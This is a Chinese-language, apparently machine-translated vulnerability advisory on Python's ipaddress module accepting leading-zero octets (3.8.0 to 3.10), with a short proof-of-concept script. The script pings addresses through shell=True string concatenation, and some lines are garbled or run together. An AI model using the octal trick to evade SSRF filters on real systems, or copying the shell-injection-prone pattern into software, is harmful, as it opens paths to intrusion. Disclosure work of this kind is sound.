**漏洞标题**

python stdlib“ ipaddress” – python 3.8.0至v3.10中八进制文字的不正确输入验证会导致不确定的SSRF和RFI漏洞。—“ ipaddress在IPv4地址中以零开头”

**CVSS分数**

待办的

  

**内部编号**

Python

IP地址标准库

  

**产品版本**

3.8.0至v3.10

  

**漏洞详情**

在Python 3.8.0至v3.10 stdlib ipaddress中对八进制字符串的输入验证不正确，允许未经身份验证的远程攻击者对许多依赖Python stdlib ipaddress的程序执行不确定的SSRF，RFI和LFI攻击。IP地址八角形被剥离，而不是被评估为有效IP地址。例如，攻击者向依赖于stdlib ipaddress的Web应用程序提交IP地址，可能会通过输入八进制输入数据而导致SSRF。如果八位位组为3位数字，则攻击者可以提交可利用的IP地址，最小的可利用八位组为08（拒绝服务），最大的可利用八位组为099。例如，攻击者可以提交010.8.8.8，即8.8.8.8。，但内置的Python ipaddress会将其评估为10.8.8.8。

  

**供应商回应**

当前未打补丁-将在下一版本中解决。

  

**概念验证**

python3.8中添加的漏洞

https://github.com/python/cpython/pull/12577

  

在变更日志中记录为易受攻击的：

https://github.com/python/cpython/blob/63298930fb531ba2bb4f23bc3b915dbf1e17e9e1/Misc/NEWS.d/3.8.0a4.rst

  

停止拒绝IPv8八位组为八进制模棱两可。前导零将被忽略，并且不再假定它指定八进制八位字节。八位字节始终是十进制数字。八位字节仍不得超过三位数，包括前导零。

```
#!/usr/bin/env python# Authors:      sickcodes, Victor Viale# License:      GPLv3+# Reference:    https://docs.python.org/3.10/library/ipaddress.html#ipaddress.IPv4Address
# Leading zeroes are tolerated only for values less than 8 (as there is no ambiguity between the decimal and octal interpretations of such strings).
import subprocessimport ipaddress
SUSPECT = '010.8.8.8'
print(ipaddress.ip_network(SUSPECT, strict=True))
BAD_IP = ipaddress.ip_address(SUSPECT)
print('http://'+str(BAD_IP))
print(str(subprocess.check_output("ping -W3 -v -c1 "+str(SUSPECT), shell=True, universal_newlines=True).strip()))
print(str(subprocess.check_output("ping -W3 -v -c1 "+str(BAD_IP), shell=True, universal_newlines=True).strip()))
```
